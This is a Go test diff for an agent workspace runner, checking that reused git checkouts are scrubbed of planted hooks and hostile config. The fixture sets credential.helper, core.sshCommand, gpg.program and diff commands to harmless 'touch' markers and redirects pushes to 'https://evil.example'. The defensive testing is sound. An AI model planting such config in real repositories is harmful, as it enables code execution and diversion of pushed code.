@@ -729,8 +729,8 @@ func TestGitSafeDirectoryArgs(t *testing.T) {
 	dir := t.TempDir()
 
 	args := gitSafeDirectoryArgs(dir, "status", "--short")
-	if len(args) != 4 {
-		t.Fatalf("len(args) = %d, want 4", len(args))
+	if len(args) != 6 {
+		t.Fatalf("len(args) = %d, want 6", len(args))
 	}
 	if args[0] != "-c" {
 		t.Fatalf("args[0] = %q, want -c", args[0])
@@ -738,8 +738,11 @@ func TestGitSafeDirectoryArgs(t *testing.T) {
 	if !strings.HasPrefix(args[1], "safe.directory=") {
 		t.Fatalf("args[1] = %q, want safe.directory=...", args[1])
 	}
-	if args[2] != "status" || args[3] != "--short" {
-		t.Fatalf("tail args = %v, want [status --short]", args[2:])
+	if args[2] != "-c" || args[3] != "core.hooksPath=/dev/null" {
+		t.Fatalf("hook args = %v, want [-c core.hooksPath=/dev/null]", args[2:4])
+	}
+	if args[4] != "status" || args[5] != "--short" {
+		t.Fatalf("tail args = %v, want [status --short]", args[4:])
 	}
 }
 
@@ -957,6 +960,159 @@ func TestRunAgent_ExistingGitWorkspaceRequiresPreparedMarker(t *testing.T) {
 	}
 	if executorCalled.Load() {
 		t.Fatal("executor ran against unmarked existing git workspace")
+	}
+}
+
+func TestRunAgent_ManagedExecutionWorkspaceReusesExistingGitCheckout(t *testing.T) {
+	bareDir := filepath.Join(t.TempDir(), "repo.git")
+	if err := os.MkdirAll(bareDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	runGit(t, bareDir, "init", "--bare")
+	workDir := filepath.Join(t.TempDir(), "work")
+	if err := os.MkdirAll(workDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	runGit(t, workDir, "clone", bareDir, ".")
+	runGit(t, workDir, "config", "user.email", "test@test.com")
+	runGit(t, workDir, "config", "user.name", "Test")
+	if err := os.WriteFile(filepath.Join(workDir, "initial.txt"), []byte("init\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	runGit(t, workDir, "add", ".")
+	runGit(t, workDir, "commit", "-m", "initial")
+	runGit(t, workDir, "push", "origin", "HEAD:main")
+	runGit(t, bareDir, "symbolic-ref", "HEAD", "refs/heads/main")
+	workspaceDir := filepath.Join(t.TempDir(), "workspace")
+	if err := CloneRepo(context.Background(), &AgentConfig{
+		GitRepo:   bareDir,
+		GitBranch: "main",
+	}, workspaceDir); err != nil {
+		t.Fatalf("initial CloneRepo failed: %v", err)
+	}
+	runGit(t, workspaceDir, "checkout", "-B", "stale-retained")
+	if err := os.WriteFile(filepath.Join(workspaceDir, "stale.txt"), []byte("stale\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	runGit(t, workspaceDir, "add", ".")
+	runGit(t, workspaceDir, "commit", "-m", "stale retained branch")
+	hookPath := filepath.Join(workspaceDir, ".git", "hooks", "post-checkout")
+	hookMarker := filepath.Join(workspaceDir, "hook-ran")
+	if err := os.WriteFile(hookPath, []byte("#!/bin/sh\ntouch hook-ran\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	runGit(t, workspaceDir, "config", "--local", "credential.helper", "!touch credential-ran")
+	runGit(t, workspaceDir, "config", "--local", "core.sshCommand", "touch ssh-ran")
+	runGit(t, workspaceDir, "config", "--local", "core.worktree", "/tmp")
+	runGit(t, workspaceDir, "config", "--local", "includeIf.gitdir:./.path", "../included-config")
+	runGit(t, workspaceDir, "config", "--local", "diff.external", "touch diff-ran")
+	runGit(t, workspaceDir, "config", "--local", "diff.demo.textconv", "touch textconv-ran")
+	runGit(t, workspaceDir, "config", "--local", "remote.origin.pushURL", "https://evil.example/repo.git")
+	runGit(t, workspaceDir, "config", "--local", "url.https://evil.example/.pushInsteadOf", "https://github.com/")
+	runGit(t, workspaceDir, "config", "--local", "commit.gpgSign", "true")
+	runGit(t, workspaceDir, "config", "--local", "gpg.program", "touch gpg-ran")
+	runGit(t, workspaceDir, "config", "--local", "extensions.worktreeConfig", "true")
+	if err := os.WriteFile(
+		filepath.Join(workspaceDir, ".git", "config.worktree"),
+		[]byte("[credential]\n\thelper = !touch worktree-config-ran\n"),
+		0o600,
+	); err != nil {
+		t.Fatal(err)
+	}
+
+	resultServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer resultServer.Close()
+
+	t.Setenv("ORKA_PROMPT", "test prompt")
+	t.Setenv("ORKA_TASK_NAME", "t1")
+	t.Setenv("ORKA_TASK_NAMESPACE", "default")
+	t.Setenv("ORKA_MAX_TURNS", "")
+	t.Setenv("ORKA_ALLOWED_TOOLS", "")
+	t.Setenv("ORKA_DISALLOWED_TOOLS", "")
+	t.Setenv("ORKA_TIMEOUT_SECONDS", "")
+	t.Setenv("ORKA_GIT_REPO", bareDir)
+	t.Setenv("ORKA_GIT_BRANCH", "main")
+	t.Setenv("ORKA_GIT_REF", "")
+	t.Setenv(workerenv.PushBranch, "feature/reuse")
+	t.Setenv("ORKA_WORKSPACE_SUBPATH", "")
+	t.Setenv("ORKA_PRIOR_TASK", "")
+	t.Setenv(workerenv.ResultEndpoint, resultServer.URL)
+	t.Setenv(workerenv.WorkspacePrepared, "")
+	t.Setenv(workerenv.ExecutionWorkspaceDepth, "1")
+	homeDir := t.TempDir()
+	t.Setenv("HOME", homeDir)
+	if err := os.WriteFile(
+		filepath.Join(homeDir, ".gitconfig"),
+		[]byte("[credential]\n\thelper = !touch global-credential-ran\n"),
+		0o600,
+	); err != nil {
+		t.Fatal(err)
+	}
+
+	var executorCalled atomic.Bool
+	err := RunAgent("test-agent", workspaceDir, 50, func(_ context.Context, _ *AgentConfig) (string, error) {
+		executorCalled.Store(true)
+		if _, statErr := os.Stat(filepath.Join(workspaceDir, "stale.txt")); statErr == nil {
+			return "", fmt.Errorf("stale retained branch file leaked into push branch")
+		} else if !os.IsNotExist(statErr) {
+			return "", statErr
+		}
+		return executorResultDone, nil
+	})
+	if err != nil {
+		t.Fatalf("RunAgent() error = %v", err)
+	}
+	if !executorCalled.Load() {
+		t.Fatal("executor did not run against managed reused workspace")
+	}
+	if _, err := os.Stat(hookMarker); err == nil {
+		t.Fatal("managed workspace refresh executed persisted git hook")
+	} else if !os.IsNotExist(err) {
+		t.Fatalf("stat hook marker: %v", err)
+	}
+	if helper, err := execGitOutputContext(
+		context.Background(), workspaceDir, "config", "--local", "--get", "credential.helper",
+	); err == nil {
+		t.Fatalf("credential.helper remained after managed refresh: %q", helper)
+	}
+	if sshCommand, err := execGitOutputContext(
+		context.Background(), workspaceDir, "config", "--local", "--get", "core.sshCommand",
+	); err == nil {
+		t.Fatalf("core.sshCommand remained after managed refresh: %q", sshCommand)
+	}
+	if worktree, err := execGitOutputContext(
+		context.Background(), workspaceDir, "config", "--local", "--get", "core.worktree",
+	); err == nil {
+		t.Fatalf("core.worktree remained after managed refresh: %q", worktree)
+	}
+	for _, name := range []string{
+		"includeIf.gitdir:./.path",
+		"diff.external",
+		"diff.demo.textconv",
+		"remote.origin.pushURL",
+		"url.https://evil.example/.pushInsteadOf",
+		"commit.gpgSign",
+		"gpg.program",
+		"extensions.worktreeConfig",
+	} {
+		if got, err := execGitOutputContext(
+			context.Background(), workspaceDir, "config", "--local", "--get", name,
+		); err == nil {
+			t.Fatalf("%s remained after managed refresh: %q", name, got)
+		}
+	}
+	if got := os.Getenv("GIT_CONFIG_GLOBAL"); got != "/dev/null" {
+		t.Fatalf("GIT_CONFIG_GLOBAL = %q, want /dev/null", got)
+	}
+	if got := os.Getenv("GIT_CONFIG_NOSYSTEM"); got != "1" {
+		t.Fatalf("GIT_CONFIG_NOSYSTEM = %q, want 1", got)
+	}
+	if _, err := os.Stat(filepath.Join(workspaceDir, ".git", "config.worktree")); err == nil {
+		t.Fatal("config.worktree remained after managed refresh")
+	} else if !os.IsNotExist(err) {
+		t.Fatalf("stat config.worktree: %v", err)
 	}
 }
 
